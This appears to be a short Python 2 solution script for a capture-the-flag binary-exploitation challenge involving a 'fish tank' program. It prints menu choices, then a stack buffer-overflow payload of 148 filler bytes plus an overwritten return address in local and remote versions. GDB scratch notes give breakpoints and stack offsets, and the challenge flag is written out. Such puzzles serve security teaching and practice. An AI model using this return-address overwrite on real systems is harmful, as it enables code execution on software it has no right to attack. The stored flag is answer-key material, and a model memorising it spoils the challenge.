nameOffset = 148
print "1"
print "1"
print "1"
print "1"
print "1"
print "1"

'''
On a 64 bit system, the return address looks like this: 0x00007fff 0x004013cc

'''

# local

# print "a"*nameOffset + "\xff\x7f\x00\x00\xa6\x11\x40\x00"

# remote

print "a"*nameOffset + "\xff\x7f\x00\x00\xb6\x11\x40\x00"
#The flag is actf{overflowed_more_than_just_a_fish_tank}


#Scratch work below
# rdi is 0x7fffffffdff0
# b *0x000000000040131c

# 0x7fffffffe080:	0xffffe000	0x00007fff	0x004013cc	0x00000000
# x 0x7fffffffe080
# x/32 0x7fffffffe080
# b* 0x0000000000401332 (after strcpy, rsi has destination = 0x7fffffffe030)

# return address is 0x7fffffffe088
# tank.name is      0x7fffffffe030
# name is           0x7fffffffdff0


